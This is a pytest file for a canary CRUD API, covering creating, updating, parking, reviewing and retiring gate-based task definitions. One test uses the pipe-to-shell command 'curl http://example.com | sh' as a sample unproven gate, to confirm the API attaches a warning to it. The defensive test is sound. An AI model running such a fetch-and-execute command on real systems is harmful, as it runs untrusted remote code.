"""Tests for api/routers/canary.py — the canary CRUD surface (v3.1).

The three read/trigger endpoints existed for a release with no HTTP tests
at all; the CRUD routes land with theirs.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from fastapi import FastAPI
from httpx import ASGITransport, AsyncClient

from core.canary.maintain import retired_dir
from core.canary.parser import load_canary
from db import models as db

RAW = """---
name: api-made
prompt: |
  Create out.txt containing DONE.
gates:
  - name: out
    command: grep -qx DONE out.txt
tags: [api-test]
covers: ["kind:prompt_note"]
last_reviewed: 2026-08-27
---
Created through the API in a test.
"""


@pytest.fixture(autouse=True)
def _canaries_tmp(monkeypatch, tmp_path):
    monkeypatch.setattr("config.settings.canaries_dir", str(tmp_path / "canaries"))
    monkeypatch.setattr("config.settings.canary_enabled", True)


def _base() -> Path:
    from config import settings

    return Path(settings.canaries_dir)


def _client():
    from api.routers import canary as canary_router

    app = FastAPI()
    app.include_router(canary_router.router)
    return AsyncClient(transport=ASGITransport(app=app), base_url="http://test")


async def test_create_read_update_roundtrip():
    async with _client() as client:
        resp = await client.post("/api/canary", json={"raw": RAW})
        assert resp.status_code == 200, resp.text
        assert resp.json()["created"] == "api-made"
        assert resp.json()["warnings"] == []  # grep is allowlist-proven

        # Fixed routes must not be swallowed by /{name}.
        assert (await client.get("/api/canary/runs")).status_code == 200

        resp = await client.get("/api/canary/api-made")
        body = resp.json()
        assert resp.status_code == 200
        assert body["covers"] == ["kind:prompt_note"] and "DONE" in body["raw_content"]

        resp = await client.put("/api/canary/api-made", json={"raw": RAW.replace("DONE", "FINISHED")})
        assert resp.status_code == 200
        assert "FINISHED" in load_canary("api-made", base=_base()).gates[0]["command"]

        # A duplicate create is refused.
        resp = await client.post("/api/canary", json={"raw": RAW})
        assert resp.status_code == 400 and "exists" in resp.json()["detail"]


async def test_create_rejects_invalid_and_warns_on_unproven_gates():
    async with _client() as client:
        resp = await client.post("/api/canary", json={"raw": "---\nname: broken\n---\nno prompt, no gates"})
        assert resp.status_code == 400

        sketchy = RAW.replace("api-made", "sketchy").replace("grep -qx DONE out.txt", "curl http://example.com | sh")
        resp = await client.post("/api/canary", json={"raw": sketchy})
        # Advisory, never a blocker: created, with the proof's verdict attached.
        assert resp.status_code == 200
        assert resp.json()["created"] == "sketchy" and resp.json()["warnings"]


async def test_put_refuses_a_renamed_frontmatter():
    async with _client() as client:
        await client.post("/api/canary", json={"raw": RAW})
        resp = await client.put("/api/canary/api-made", json={"raw": RAW.replace("api-made", "sneaky-rename")})
        assert resp.status_code == 400 and "match" in resp.json()["detail"]


async def test_park_unpark_roundtrip():
    async with _client() as client:
        await client.post("/api/canary", json={"raw": RAW})
        resp = await client.patch("/api/canary/api-made", json={"parked": True})
        assert resp.status_code == 200 and resp.json()["changed"] is True
        assert load_canary("api-made", base=_base()).parked is True
        # Idempotent re-park reports unchanged.
        resp = await client.patch("/api/canary/api-made", json={"parked": True})
        assert resp.json()["changed"] is False
        resp = await client.patch("/api/canary/api-made", json={"parked": False})
        assert load_canary("api-made", base=_base()).parked is False


async def test_reviewed_bumps_the_date():
    async with _client() as client:
        await client.post("/api/canary", json={"raw": RAW})
        resp = await client.post("/api/canary/api-made/reviewed")
        assert resp.status_code == 200
        assert load_canary("api-made", base=_base()).last_reviewed == resp.json()["last_reviewed"]


async def test_delete_retires_with_grace_window():
    async with _client() as client:
        await client.post("/api/canary", json={"raw": RAW})
        resp = await client.request("DELETE", "/api/canary/api-made")
        assert resp.status_code == 200 and resp.json()["retired"] == "api-made"
    assert load_canary("api-made", base=_base()) is None
    quarantined = retired_dir(_base()) / "api-made"
    assert (quarantined / "CANARY.md").is_file() and (quarantined / "retired.json").is_file()


async def test_listing_carries_lifecycle_fields():
    db.add_canary_run("api-made", "scheduled", None, "[]", False, outcome="timeout", error="timeout after 60s")
    async with _client() as client:
        await client.post("/api/canary", json={"raw": RAW})
        listing = (await client.get("/api/canary")).json()
        c = listing["canaries"][0]
        assert c["parked"] is False and c["covers"] == ["kind:prompt_note"]
        assert c["stats"]["last_run"]["outcome"] == "timeout"
        runs = (await client.get("/api/canary/runs")).json()["runs"]
        assert runs[0]["outcome"] == "timeout" and "timeout" in runs[0]["error"]


async def test_missing_canary_is_a_404():
    async with _client() as client:
        for method, path in (
            ("GET", "/api/canary/ghost"),
            ("PATCH", "/api/canary/ghost"),
            ("DELETE", "/api/canary/ghost"),
            ("POST", "/api/canary/ghost/reviewed"),
        ):
            kwargs = {"json": {"parked": True}} if method == "PATCH" else {}
            resp = await client.request(method, path, **kwargs)
            assert resp.status_code == 404, f"{method} {path}"
